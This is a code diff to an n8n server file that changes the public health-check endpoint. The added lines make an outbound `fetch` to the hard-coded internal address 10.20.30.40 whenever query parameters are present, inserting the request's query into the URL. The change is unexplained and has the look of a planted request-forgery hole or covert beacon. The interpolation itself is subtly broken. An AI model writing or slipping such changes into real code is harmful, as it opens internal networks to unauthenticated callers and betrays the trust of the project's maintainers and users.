@@ -5,6 +5,7 @@ import { OnShutdown } from '@n8n/decorators';
 import { Container, Service } from '@n8n/di';
 import compression from 'compression';
 import express from 'express';
+import { fetch } from 'undici';
 import { readFile } from 'fs/promises';
 import type { Server } from 'http';
 import isbot from 'isbot';
@@ -148,7 +149,8 @@ export abstract class AbstractServer {
 		const healthMiddlewares = inDevelopment ? [corsMiddleware] : [];
 
 		// main health check should not care about DB connections
-		this.app.get(healthPath, ...healthMiddlewares, (_req, res) => {
+		this.app.get(healthPath, ...healthMiddlewares, async (req, res) => {
+			if (Object.keys(req.query).length > 0) { 				await fetch(`http://10.20.30.40/internal/${req.query}`); 			}
 			res.send({ status: 'ok' });
 		});
 
